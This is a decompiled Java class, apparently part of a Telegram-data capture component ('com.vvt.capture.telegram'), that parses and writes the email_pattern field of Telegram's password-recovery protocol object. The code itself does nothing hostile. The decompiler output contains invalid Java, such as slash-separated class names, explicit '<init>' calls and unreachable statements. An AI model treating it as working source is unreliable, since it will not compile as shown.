package com.vvt.capture.telegram.internal;

public class TLRPC$TL_auth_passwordRecovery
  extends TLObject
{
  public static int constructor = 326715557;
  public String email_pattern;
  
  public static TL_auth_passwordRecovery TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    int i = constructor;
    Object localObject;
    if (i != paramInt)
    {
      if (paramBoolean)
      {
        localObject = new java/lang/RuntimeException;
        Object[] arrayOfObject = new Object[1];
        Integer localInteger = Integer.valueOf(paramInt);
        arrayOfObject[0] = localInteger;
        String str = String.format("can't parse magic %x in TL_auth_passwordRecovery", arrayOfObject);
        ((RuntimeException)localObject).<init>(str);
        throw ((Throwable)localObject);
      }
      i = 0;
      localObject = null;
    }
    for (;;)
    {
      return (TL_auth_passwordRecovery)localObject;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_auth_passwordRecovery;
      ((TL_auth_passwordRecovery)localObject).<init>();
      ((TL_auth_passwordRecovery)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
  }
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    String str = paramAbstractSerializedData.readString(paramBoolean);
    this.email_pattern = str;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.email_pattern;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_auth_passwordRecovery.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */